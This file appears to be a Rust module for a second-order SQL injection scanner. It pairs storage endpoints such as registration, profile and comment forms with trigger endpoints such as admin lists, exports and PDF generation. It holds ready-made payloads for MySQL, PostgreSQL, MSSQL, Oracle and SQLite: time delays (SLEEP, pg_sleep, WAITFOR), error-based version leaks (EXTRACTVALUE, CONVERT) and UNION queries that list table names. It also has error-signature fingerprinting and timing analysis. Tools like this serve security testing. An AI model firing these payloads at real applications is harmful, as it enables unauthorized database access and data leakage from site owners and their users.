use std::collections::{HashMap, HashSet};
use std::fmt;

/// Supported SQL database backends for second-order injection targeting.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SqlBackend {
    MySQL,
    PostgreSQL,
    MSSQL,
    Oracle,
    SQLite,
}

impl fmt::Display for SqlBackend {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::MySQL => "mysql",
            Self::PostgreSQL => "postgresql",
            Self::MSSQL => "mssql",
            Self::Oracle => "oracle",
            Self::SQLite => "sqlite",
        };
        write!(f, "{label}")
    }
}

impl SqlBackend {
    pub fn all() -> &'static [SqlBackend] {
        &[
            Self::MySQL,
            Self::PostgreSQL,
            Self::MSSQL,
            Self::Oracle,
            Self::SQLite,
        ]
    }
}

/// HTTP method used for a storage or trigger request.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum HttpMethod {
    Get,
    Post,
    Put,
    Patch,
    Delete,
}

impl fmt::Display for HttpMethod {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Get => "GET",
            Self::Post => "POST",
            Self::Put => "PUT",
            Self::Patch => "PATCH",
            Self::Delete => "DELETE",
        };
        write!(f, "{label}")
    }
}

/// Classification of an endpoint's role in a second-order chain.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum EndpointRole {
    /// Stores user-controlled data (registration, profile update, comment).
    Storage,
    /// Retrieves or processes stored data (admin panel, report, export).
    Trigger,
    /// Confirms exploitation success (error page, data leak endpoint).
    Verification,
}

impl fmt::Display for EndpointRole {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Storage => "storage",
            Self::Trigger => "trigger",
            Self::Verification => "verification",
        };
        write!(f, "{label}")
    }
}

/// Category of second-order SQLi verification technique.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum VerificationMethod {
    TimeDelay,
    ErrorBased,
    ContentDiff,
    OutOfBand,
}

impl fmt::Display for VerificationMethod {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::TimeDelay => "time-delay",
            Self::ErrorBased => "error-based",
            Self::ContentDiff => "content-diff",
            Self::OutOfBand => "out-of-band",
        };
        write!(f, "{label}")
    }
}

/// Common storage vector patterns where user data persists.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum StoragePattern {
    UserRegistration,
    ProfileUpdate,
    CommentSubmission,
    AddressBook,
    FileUploadMetadata,
    SearchHistory,
    Preferences,
    ApiKeyLabel,
}

impl fmt::Display for StoragePattern {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::UserRegistration => "user-registration",
            Self::ProfileUpdate => "profile-update",
            Self::CommentSubmission => "comment-submission",
            Self::AddressBook => "address-book",
            Self::FileUploadMetadata => "file-upload-metadata",
            Self::SearchHistory => "search-history",
            Self::Preferences => "preferences",
            Self::ApiKeyLabel => "api-key-label",
        };
        write!(f, "{label}")
    }
}

/// Common trigger vector patterns where stored data is consumed.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum TriggerPattern {
    AdminUserList,
    ReportExport,
    SearchResults,
    AuditLog,
    DataExport,
    EmailNotification,
    PdfGeneration,
    BackupRestore,
}

impl fmt::Display for TriggerPattern {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::AdminUserList => "admin-user-list",
            Self::ReportExport => "report-export",
            Self::SearchResults => "search-results",
            Self::AuditLog => "audit-log",
            Self::DataExport => "data-export",
            Self::EmailNotification => "email-notification",
            Self::PdfGeneration => "pdf-generation",
            Self::BackupRestore => "backup-restore",
        };
        write!(f, "{label}")
    }
}

/// An endpoint identified as participating in a second-order SQLi chain.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct EndpointDescriptor {
    pub path: String,
    pub method: HttpMethod,
    pub role: EndpointRole,
    pub parameter: String,
    pub content_type: String,
}

impl EndpointDescriptor {
    pub fn storage(path: &str, method: HttpMethod, parameter: &str) -> Self {
        Self {
            path: path.to_string(),
            method,
            role: EndpointRole::Storage,
            parameter: parameter.to_string(),
            content_type: "application/json".to_string(),
        }
    }

    pub fn trigger(path: &str, method: HttpMethod) -> Self {
        Self {
            path: path.to_string(),
            method,
            role: EndpointRole::Trigger,
            parameter: String::new(),
            content_type: "application/json".to_string(),
        }
    }

    pub fn verification(path: &str, method: HttpMethod) -> Self {
        Self {
            path: path.to_string(),
            method,
            role: EndpointRole::Verification,
            parameter: String::new(),
            content_type: "application/json".to_string(),
        }
    }

    pub fn with_content_type(mut self, ct: &str) -> Self {
        self.content_type = ct.to_string();
        self
    }
}

/// A second-order SQLi payload designed for a specific backend.
#[derive(Debug, Clone)]
pub struct SecondOrderPayload {
    pub backend: SqlBackend,
    pub storage_value: String,
    pub verification_method: VerificationMethod,
    pub description: String,
    pub delay_seconds: u32,
}

/// A paired store-then-trigger test case.
#[derive(Debug, Clone)]
pub struct PayloadTriggerPair {
    pub id: usize,
    pub storage_endpoint: EndpointDescriptor,
    pub trigger_endpoint: EndpointDescriptor,
    pub payload: SecondOrderPayload,
    pub storage_pattern: StoragePattern,
    pub trigger_pattern: TriggerPattern,
}

impl PayloadTriggerPair {
    pub fn expected_delay_ms(&self) -> u64 {
        u64::from(self.payload.delay_seconds) * 1000
    }
}

/// Node in a multi-step attack chain graph.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct ChainNode {
    pub id: u32,
    pub endpoint: EndpointDescriptor,
    pub label: String,
}

/// Directed edge in a multi-step attack chain.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ChainEdge {
    pub from: u32,
    pub to: u32,
    pub relationship: ChainRelationship,
}

/// Describes how two nodes in a chain relate.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum ChainRelationship {
    StoresDataFor,
    TriggersProcessingOf,
    RevealsResultOf,
}

impl fmt::Display for ChainRelationship {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::StoresDataFor => "stores-data-for",
            Self::TriggersProcessingOf => "triggers-processing-of",
            Self::RevealsResultOf => "reveals-result-of",
        };
        write!(f, "{label}")
    }
}

/// Directed graph representing a multi-step second-order SQLi attack chain.
#[derive(Debug, Clone)]
pub struct AttackChainGraph {
    nodes: Vec<ChainNode>,
    edges: Vec<ChainEdge>,
    adjacency: HashMap<u32, Vec<u32>>,
}

impl AttackChainGraph {
    pub fn new() -> Self {
        Self {
            nodes: Vec::new(),
            edges: Vec::new(),
            adjacency: HashMap::new(),
        }
    }

    pub fn add_node(&mut self, node: ChainNode) {
        let id = node.id;
        if !self.nodes.iter().any(|n| n.id == id) {
            self.nodes.push(node);
            self.adjacency.entry(id).or_default();
        }
    }

    pub fn add_edge(&mut self, edge: ChainEdge) {
        self.adjacency.entry(edge.from).or_default().push(edge.to);
        self.adjacency.entry(edge.to).or_default();
        self.edges.push(edge);
    }

    pub fn nodes(&self) -> &[ChainNode] {
        &self.nodes
    }

    pub fn edges(&self) -> &[ChainEdge] {
        &self.edges
    }

    pub fn neighbors(&self, node_id: u32) -> &[u32] {
        self.adjacency
            .get(&node_id)
            .map(|v| v.as_slice())
            .unwrap_or(&[])
    }

    pub fn node_count(&self) -> usize {
        self.nodes.len()
    }

    pub fn edge_count(&self) -> usize {
        self.edges.len()
    }

    /// Find all paths from a storage node to a verification node using DFS.
    pub fn find_attack_paths(&self, start: u32, end: u32) -> Vec<Vec<u32>> {
        let mut paths = Vec::new();
        let mut current_path = vec![start];
        let mut visited = HashSet::new();
        visited.insert(start);
        self.dfs_paths(start, end, &mut visited, &mut current_path, &mut paths);
        paths
    }

    fn dfs_paths(
        &self,
        current: u32,
        target: u32,
        visited: &mut HashSet<u32>,
        path: &mut Vec<u32>,
        results: &mut Vec<Vec<u32>>,
    ) {
        if current == target {
            results.push(path.clone());
            return;
        }
        for &neighbor in self.neighbors(current) {
            if !visited.contains(&neighbor) {
                visited.insert(neighbor);
                path.push(neighbor);
                self.dfs_paths(neighbor, target, visited, path, results);
                path.pop();
                visited.remove(&neighbor);
            }
        }
    }

    /// Returns nodes with no incoming edges (chain entry points).
    pub fn source_nodes(&self) -> Vec<u32> {
        let targets: HashSet<u32> = self.edges.iter().map(|e| e.to).collect();
        self.nodes
            .iter()
            .filter(|n| !targets.contains(&n.id))
            .map(|n| n.id)
            .collect()
    }

    /// Returns nodes with no outgoing edges (chain terminals).
    pub fn sink_nodes(&self) -> Vec<u32> {
        self.nodes
            .iter()
            .filter(|n| self.neighbors(n.id).is_empty())
            .map(|n| n.id)
            .collect()
    }

    /// Export the chain to DOT format for visualization.
    pub fn to_dot(&self) -> String {
        let mut out = String::from("digraph attack_chain {\n");
        out.push_str("  rankdir=LR;\n");
        out.push_str("  node [shape=box];\n");
        for node in &self.nodes {
            let shape = match node.endpoint.role {
                EndpointRole::Storage => "box",
                EndpointRole::Trigger => "diamond",
                EndpointRole::Verification => "ellipse",
            };
            out.push_str(&format!(
                "  n{} [label=\"{}\\n{}\" shape={}];\n",
                node.id, node.label, node.endpoint.path, shape
            ));
        }
        for edge in &self.edges {
            out.push_str(&format!(
                "  n{} -> n{} [label=\"{}\"];\n",
                edge.from, edge.to, edge.relationship
            ));
        }
        out.push_str("}\n");
        out
    }
}

impl Default for AttackChainGraph {
    fn default() -> Self {
        Self::new()
    }
}

/// Time-delay payloads per database backend.
fn time_delay_payloads() -> Vec<SecondOrderPayload> {
    vec![
        SecondOrderPayload {
            backend: SqlBackend::MySQL,
            storage_value: "admin' OR SLEEP(5)-- -".to_string(),
            verification_method: VerificationMethod::TimeDelay,
            description: "MySQL SLEEP in stored username triggers delay on admin listing".to_string(),
            delay_seconds: 5,
        },
        SecondOrderPayload {
            backend: SqlBackend::MySQL,
            storage_value: "test' OR BENCHMARK(10000000,SHA1('a'))-- -".to_string(),
            verification_method: VerificationMethod::TimeDelay,
            description: "MySQL BENCHMARK heavy computation via stored field".to_string(),
            delay_seconds: 5,
        },
        SecondOrderPayload {
            backend: SqlBackend::PostgreSQL,
            storage_value: "admin' OR pg_sleep(5)-- -".to_string(),
            verification_method: VerificationMethod::TimeDelay,
            description: "PostgreSQL pg_sleep in stored value triggers on report generation".to_string(),
            delay_seconds: 5,
        },
        SecondOrderPayload {
            backend: SqlBackend::PostgreSQL,
            storage_value: "x'||(SELECT pg_sleep(5))-- -".to_string(),
            verification_method: VerificationMethod::TimeDelay,
            description: "PostgreSQL pg_sleep via subquery concatenation in stored data".to_string(),
            delay_seconds: 5,
        },
        SecondOrderPayload {
            backend: SqlBackend::MSSQL,
            storage_value: "admin'; WAITFOR DELAY '0:0:5'-- -".to_string(),
            verification_method: VerificationMethod::TimeDelay,
            description: "MSSQL WAITFOR DELAY triggered when stored username is queried".to_string(),
            delay_seconds: 5,
        },
        SecondOrderPayload {
            backend: SqlBackend::MSSQL,
            storage_value: "x'; IF 1=1 WAITFOR DELAY '0:0:5'-- -".to_string(),
            verification_method: VerificationMethod::TimeDelay,
            description: "MSSQL conditional WAITFOR via stored value".to_string(),
            delay_seconds: 5,
        },
        SecondOrderPayload {
            backend: SqlBackend::Oracle,
            storage_value: "admin'||DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -".to_string(),
            verification_method: VerificationMethod::TimeDelay,
            description: "Oracle DBMS_PIPE.RECEIVE_MESSAGE delay via stored concatenation".to_string(),
            delay_seconds: 5,
        },
        SecondOrderPayload {
            backend: SqlBackend::Oracle,
            storage_value: "admin' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)-- -".to_string(),
            verification_method: VerificationMethod::TimeDelay,
            description: "Oracle conditional time delay in WHERE clause from stored data".to_string(),
            delay_seconds: 5,
        },
        SecondOrderPayload {
            backend: SqlBackend::SQLite,
            storage_value: "admin' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -".to_string(),
            verification_method: VerificationMethod::TimeDelay,
            description: "SQLite heavy computation via RANDOMBLOB in stored value".to_string(),
            delay_seconds: 5,
        },
        SecondOrderPayload {
            backend: SqlBackend::SQLite,
            storage_value: "admin' UNION SELECT CASE WHEN 1=1 THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(250000000)))) ELSE 0 END-- -".to_string(),
            verification_method: VerificationMethod::TimeDelay,
            description: "SQLite conditional heavy RANDOMBLOB via UNION in stored data".to_string(),
            delay_seconds: 5,
        },
    ]
}

/// Error-based payloads per database backend.
fn error_based_payloads() -> Vec<SecondOrderPayload> {
    vec![
        SecondOrderPayload {
            backend: SqlBackend::MySQL,
            storage_value: "admin' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -".to_string(),
            verification_method: VerificationMethod::ErrorBased,
            description: "MySQL EXTRACTVALUE error leaks version via stored username".to_string(),
            delay_seconds: 0,
        },
        SecondOrderPayload {
            backend: SqlBackend::MySQL,
            storage_value: "admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)-- -".to_string(),
            verification_method: VerificationMethod::ErrorBased,
            description: "MySQL UPDATEXML error exfiltration through stored data".to_string(),
            delay_seconds: 0,
        },
        SecondOrderPayload {
            backend: SqlBackend::PostgreSQL,
            storage_value: "admin' AND 1=CAST((SELECT version()) AS int)-- -".to_string(),
            verification_method: VerificationMethod::ErrorBased,
            description: "PostgreSQL CAST error leaks version through stored field".to_string(),
            delay_seconds: 0,
        },
        SecondOrderPayload {
            backend: SqlBackend::MSSQL,
            storage_value: "admin' AND 1=CONVERT(int,(SELECT @@version))-- -".to_string(),
            verification_method: VerificationMethod::ErrorBased,
            description: "MSSQL CONVERT error leaks version when stored data queried".to_string(),
            delay_seconds: 0,
        },
        SecondOrderPayload {
            backend: SqlBackend::Oracle,
            storage_value: "admin' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -".to_string(),
            verification_method: VerificationMethod::ErrorBased,
            description: "Oracle UTL_INADDR error leaks version from stored data".to_string(),
            delay_seconds: 0,
        },
        SecondOrderPayload {
            backend: SqlBackend::SQLite,
            storage_value: "admin' AND CASE WHEN 1=1 THEN load_extension('x') ELSE 0 END-- -".to_string(),
            verification_method: VerificationMethod::ErrorBased,
            description: "SQLite load_extension error triggered from stored value".to_string(),
            delay_seconds: 0,
        },
    ]
}

/// Content-diff payloads that alter query results when stored data is consumed.
fn content_diff_payloads() -> Vec<SecondOrderPayload> {
    vec![
        SecondOrderPayload {
            backend: SqlBackend::MySQL,
            storage_value: "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -"
                .to_string(),
            verification_method: VerificationMethod::ContentDiff,
            description: "MySQL UNION to leak table names via stored field rendering".to_string(),
            delay_seconds: 0,
        },
        SecondOrderPayload {
            backend: SqlBackend::PostgreSQL,
            storage_value: "' UNION SELECT NULL,tablename,NULL FROM pg_tables-- -".to_string(),
            verification_method: VerificationMethod::ContentDiff,
            description: "PostgreSQL UNION leaks table names when stored data is rendered"
                .to_string(),
            delay_seconds: 0,
        },
        SecondOrderPayload {
            backend: SqlBackend::MSSQL,
            storage_value: "' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'-- -"
                .to_string(),
            verification_method: VerificationMethod::ContentDiff,
            description: "MSSQL UNION leaks table names from sysobjects via stored data"
                .to_string(),
            delay_seconds: 0,
        },
        SecondOrderPayload {
            backend: SqlBackend::Oracle,
            storage_value:
                "' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE ROWNUM<=5-- -"
                    .to_string(),
            verification_method: VerificationMethod::ContentDiff,
            description: "Oracle UNION leaks table names from all_tables via stored field"
                .to_string(),
            delay_seconds: 0,
        },
        SecondOrderPayload {
            backend: SqlBackend::SQLite,
            storage_value:
                "' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'-- -"
                    .to_string(),
            verification_method: VerificationMethod::ContentDiff,
            description: "SQLite UNION leaks table names from sqlite_master via stored data"
                .to_string(),
            delay_seconds: 0,
        },
    ]
}

/// Common storage-trigger endpoint pattern pairs.
fn common_storage_trigger_patterns() -> Vec<(
    StoragePattern,
    TriggerPattern,
    &'static str,
    &'static str,
    &'static str,
)> {
    vec![
        (
            StoragePattern::UserRegistration,
            TriggerPattern::AdminUserList,
            "/api/register",
            "/admin/users",
            "username",
        ),
        (
            StoragePattern::ProfileUpdate,
            TriggerPattern::ReportExport,
            "/api/profile",
            "/admin/reports/export",
            "display_name",
        ),
        (
            StoragePattern::CommentSubmission,
            TriggerPattern::DataExport,
            "/api/comments",
            "/admin/export/comments",
            "body",
        ),
        (
            StoragePattern::AddressBook,
            TriggerPattern::PdfGeneration,
            "/api/addresses",
            "/admin/invoices/pdf",
            "street",
        ),
        (
            StoragePattern::FileUploadMetadata,
            TriggerPattern::AuditLog,
            "/api/files/upload",
            "/admin/audit-log",
            "filename",
        ),
        (
            StoragePattern::SearchHistory,
            TriggerPattern::SearchResults,
            "/api/search",
            "/admin/search-analytics",
            "query",
        ),
        (
            StoragePattern::Preferences,
            TriggerPattern::EmailNotification,
            "/api/preferences",
            "/admin/notifications/send",
            "display_format",
        ),
        (
            StoragePattern::ApiKeyLabel,
            TriggerPattern::BackupRestore,
            "/api/keys",
            "/admin/backup/export",
            "label",
        ),
    ]
}

/// Generates all second-order SQLi payload-trigger pairs.
/// Returns at least 10 pairs covering all backends and verification methods.
pub fn generate_payload_trigger_pairs() -> Vec<PayloadTriggerPair> {
    let mut pairs = Vec::new();

    let all_payloads: Vec<SecondOrderPayload> = time_delay_payloads()
        .into_iter()
        .chain(error_based_payloads())
        .chain(content_diff_payloads())
        .collect();

    let patterns = common_storage_trigger_patterns();

    for (idx, payload) in all_payloads.iter().enumerate() {
        let pattern_idx = idx % patterns.len();
        let (storage_pat, trigger_pat, store_path, trigger_path, param) = &patterns[pattern_idx];

        pairs.push(PayloadTriggerPair {
            id: idx,
            storage_endpoint: EndpointDescriptor::storage(store_path, HttpMethod::Post, param),
            trigger_endpoint: EndpointDescriptor::trigger(trigger_path, HttpMethod::Get),
            payload: payload.clone(),
            storage_pattern: *storage_pat,
            trigger_pattern: *trigger_pat,
        });
    }

    pairs
}

/// Generates time-delay payload-trigger pairs for a specific backend.
pub fn generate_time_delay_pairs(backend: SqlBackend) -> Vec<PayloadTriggerPair> {
    generate_payload_trigger_pairs()
        .into_iter()
        .filter(|p| {
            p.payload.backend == backend
                && p.payload.verification_method == VerificationMethod::TimeDelay
        })
        .collect()
}

/// Generates error-based payload-trigger pairs for a specific backend.
pub fn generate_error_based_pairs(backend: SqlBackend) -> Vec<PayloadTriggerPair> {
    generate_payload_trigger_pairs()
        .into_iter()
        .filter(|p| {
            p.payload.backend == backend
                && p.payload.verification_method == VerificationMethod::ErrorBased
        })
        .collect()
}

/// Identifies candidate storage endpoints from a list of paths and methods.
pub fn identify_storage_vectors(endpoints: &[(&str, HttpMethod)]) -> Vec<EndpointDescriptor> {
    let storage_indicators = [
        "register",
        "signup",
        "profile",
        "update",
        "comment",
        "post",
        "upload",
        "submit",
        "create",
        "add",
        "save",
        "write",
        "insert",
        "address",
        "preference",
        "setting",
        "feedback",
        "review",
    ];

    endpoints
        .iter()
        .filter(|(path, method)| {
            let is_write_method = matches!(
                method,
                HttpMethod::Post | HttpMethod::Put | HttpMethod::Patch
            );
            let path_lower = path.to_lowercase();
            let matches_pattern = storage_indicators
                .iter()
                .any(|ind| path_lower.contains(ind));
            is_write_method && matches_pattern
        })
        .map(|(path, method)| EndpointDescriptor::storage(path, *method, "input"))
        .collect()
}

/// Identifies candidate trigger endpoints from a list of paths and methods.
pub fn identify_trigger_vectors(endpoints: &[(&str, HttpMethod)]) -> Vec<EndpointDescriptor> {
    let trigger_indicators = [
        "admin",
        "export",
        "report",
        "list",
        "search",
        "analytics",
        "audit",
        "log",
        "backup",
        "pdf",
        "print",
        "notify",
        "email",
        "dashboard",
        "overview",
        "summary",
        "invoice",
        "download",
    ];

    endpoints
        .iter()
        .filter(|(path, _)| {
            let path_lower = path.to_lowercase();
            trigger_indicators
                .iter()
                .any(|ind| path_lower.contains(ind))
        })
        .map(|(path, method)| EndpointDescriptor::trigger(path, *method))
        .collect()
}

/// Builds a multi-step attack chain graph from endpoints and payloads.
pub fn build_attack_chain(
    storage_endpoints: &[EndpointDescriptor],
    trigger_endpoints: &[EndpointDescriptor],
    verification_endpoints: &[EndpointDescriptor],
) -> AttackChainGraph {
    let mut graph = AttackChainGraph::new();
    let mut node_id: u32 = 0;

    let mut storage_ids = Vec::new();
    for ep in storage_endpoints {
        let id = node_id;
        graph.add_node(ChainNode {
            id,
            endpoint: ep.clone(),
            label: format!("Store({})", ep.path),
        });
        storage_ids.push(id);
        node_id += 1;
    }

    let mut trigger_ids = Vec::new();
    for ep in trigger_endpoints {
        let id = node_id;
        graph.add_node(ChainNode {
            id,
            endpoint: ep.clone(),
            label: format!("Trigger({})", ep.path),
        });
        trigger_ids.push(id);
        node_id += 1;
    }

    let mut verify_ids = Vec::new();
    for ep in verification_endpoints {
        let id = node_id;
        graph.add_node(ChainNode {
            id,
            endpoint: ep.clone(),
            label: format!("Verify({})", ep.path),
        });
        verify_ids.push(id);
        node_id += 1;
    }

    for &s_id in &storage_ids {
        for &t_id in &trigger_ids {
            graph.add_edge(ChainEdge {
                from: s_id,
                to: t_id,
                relationship: ChainRelationship::StoresDataFor,
            });
        }
    }

    for &t_id in &trigger_ids {
        for &v_id in &verify_ids {
            graph.add_edge(ChainEdge {
                from: t_id,
                to: v_id,
                relationship: ChainRelationship::RevealsResultOf,
            });
        }
    }

    graph
}

/// Builds a chain graph specifically modeling a three-step attack:
/// store via A -> trigger via B -> verify via C.
pub fn build_three_step_chain(
    store: EndpointDescriptor,
    trigger: EndpointDescriptor,
    verify: EndpointDescriptor,
) -> AttackChainGraph {
    let mut graph = AttackChainGraph::new();

    graph.add_node(ChainNode {
        id: 0,
        endpoint: store.clone(),
        label: format!("Store({})", store.path),
    });
    graph.add_node(ChainNode {
        id: 1,
        endpoint: trigger.clone(),
        label: format!("Trigger({})", trigger.path),
    });
    graph.add_node(ChainNode {
        id: 2,
        endpoint: verify.clone(),
        label: format!("Verify({})", verify.path),
    });

    graph.add_edge(ChainEdge {
        from: 0,
        to: 1,
        relationship: ChainRelationship::StoresDataFor,
    });
    graph.add_edge(ChainEdge {
        from: 1,
        to: 2,
        relationship: ChainRelationship::RevealsResultOf,
    });

    graph
}

/// Error signatures for detecting SQL backend from error messages.
struct SqlErrorSignature {
    backend: SqlBackend,
    pattern: &'static str,
    confidence: f64,
}

const SQL_ERROR_SIGNATURES: &[SqlErrorSignature] = &[
    SqlErrorSignature {
        backend: SqlBackend::MySQL,
        pattern: "You have an error in your SQL syntax",
        confidence: 0.95,
    },
    SqlErrorSignature {
        backend: SqlBackend::MySQL,
        pattern: "mysql_fetch",
        confidence: 0.90,
    },
    SqlErrorSignature {
        backend: SqlBackend::MySQL,
        pattern: "MariaDB",
        confidence: 0.90,
    },
    SqlErrorSignature {
        backend: SqlBackend::MySQL,
        pattern: "MySQLSyntaxErrorException",
        confidence: 0.95,
    },
    SqlErrorSignature {
        backend: SqlBackend::PostgreSQL,
        pattern: "PSQLException",
        confidence: 0.95,
    },
    SqlErrorSignature {
        backend: SqlBackend::PostgreSQL,
        pattern: "pg_query",
        confidence: 0.90,
    },
    SqlErrorSignature {
        backend: SqlBackend::PostgreSQL,
        pattern: "unterminated quoted string",
        confidence: 0.85,
    },
    SqlErrorSignature {
        backend: SqlBackend::PostgreSQL,
        pattern: "syntax error at or near",
        confidence: 0.90,
    },
    SqlErrorSignature {
        backend: SqlBackend::MSSQL,
        pattern: "Microsoft SQL Server",
        confidence: 0.95,
    },
    SqlErrorSignature {
        backend: SqlBackend::MSSQL,
        pattern: "Unclosed quotation mark",
        confidence: 0.90,
    },
    SqlErrorSignature {
        backend: SqlBackend::MSSQL,
        pattern: "SqlException",
        confidence: 0.85,
    },
    SqlErrorSignature {
        backend: SqlBackend::Oracle,
        pattern: "ORA-",
        confidence: 0.95,
    },
    SqlErrorSignature {
        backend: SqlBackend::Oracle,
        pattern: "oracle.jdbc",
        confidence: 0.90,
    },
    SqlErrorSignature {
        backend: SqlBackend::Oracle,
        pattern: "PLS-",
        confidence: 0.85,
    },
    SqlErrorSignature {
        backend: SqlBackend::SQLite,
        pattern: "SQLITE_ERROR",
        confidence: 0.95,
    },
    SqlErrorSignature {
        backend: SqlBackend::SQLite,
        pattern: "sqlite3.OperationalError",
        confidence: 0.90,
    },
    SqlErrorSignature {
        backend: SqlBackend::SQLite,
        pattern: "near \"",
        confidence: 0.80,
    },
];

/// Result of fingerprinting a SQL backend from an error response.
#[derive(Debug, Clone)]
pub struct SqlBackendFingerprint {
    pub detected_backend: SqlBackend,
    pub confidence: f64,
    pub matched_pattern: String,
}

/// Fingerprint the SQL backend from an error response body.
pub fn fingerprint_backend(response_body: &str) -> Vec<SqlBackendFingerprint> {
    let mut results = Vec::new();
    for sig in SQL_ERROR_SIGNATURES {
        if response_body.contains(sig.pattern) {
            results.push(SqlBackendFingerprint {
                detected_backend: sig.backend,
                confidence: sig.confidence,
                matched_pattern: sig.pattern.to_string(),
            });
        }
    }
    results.sort_by(|a, b| {
        b.confidence
            .partial_cmp(&a.confidence)
            .unwrap_or(std::cmp::Ordering::Equal)
    });
    results
}

/// Analyzes a timing response to determine if a time-delay payload triggered.
pub fn analyze_timing_response(
    baseline_ms: u64,
    measured_ms: u64,
    expected_delay_ms: u64,
) -> TimingAnalysis {
    let diff = measured_ms.saturating_sub(baseline_ms);
    let threshold = expected_delay_ms * 80 / 100;
    let triggered = diff >= threshold;
    let confidence = if triggered {
        let ratio = diff as f64 / expected_delay_ms as f64;
        (ratio.min(2.0) / 2.0).min(1.0)
    } else {
        0.0
    };
    TimingAnalysis {
        baseline_ms,
        measured_ms,
        difference_ms: diff,
        expected_delay_ms,
        triggered,
        confidence,
    }
}

/// Result of timing analysis for a time-delay second-order SQLi attempt.
#[derive(Debug, Clone)]
pub struct TimingAnalysis {
    pub baseline_ms: u64,
    pub measured_ms: u64,
    pub difference_ms: u64,
    pub expected_delay_ms: u64,
    pub triggered: bool,
    pub confidence: f64,
}

/// Summary statistics for a second-order SQLi scan campaign.
#[derive(Debug, Clone)]
pub struct CampaignSummary {
    pub total_pairs: usize,
    pub pairs_by_backend: HashMap<SqlBackend, usize>,
    pub pairs_by_method: HashMap<VerificationMethod, usize>,
    pub storage_patterns_used: HashSet<StoragePattern>,
    pub trigger_patterns_used: HashSet<TriggerPattern>,
    pub unique_storage_endpoints: usize,
    pub unique_trigger_endpoints: usize,
}

/// Computes summary statistics over a set of payload-trigger pairs.
pub fn summarize_campaign(pairs: &[PayloadTriggerPair]) -> CampaignSummary {
    let mut pairs_by_backend: HashMap<SqlBackend, usize> = HashMap::new();
    let mut pairs_by_method: HashMap<VerificationMethod, usize> = HashMap::new();
    let mut storage_patterns = HashSet::new();
    let mut trigger_patterns = HashSet::new();
    let mut storage_eps = HashSet::new();
    let mut trigger_eps = HashSet::new();

    for pair in pairs {
        *pairs_by_backend.entry(pair.payload.backend).or_insert(0) += 1;
        *pairs_by_method
            .entry(pair.payload.verification_method)
            .or_insert(0) += 1;
        storage_patterns.insert(pair.storage_pattern);
        trigger_patterns.insert(pair.trigger_pattern);
        storage_eps.insert(pair.storage_endpoint.path.clone());
        trigger_eps.insert(pair.trigger_endpoint.path.clone());
    }

    CampaignSummary {
        total_pairs: pairs.len(),
        pairs_by_backend,
        pairs_by_method,
        storage_patterns_used: storage_patterns,
        trigger_patterns_used: trigger_patterns,
        unique_storage_endpoints: storage_eps.len(),
        unique_trigger_endpoints: trigger_eps.len(),
    }
}
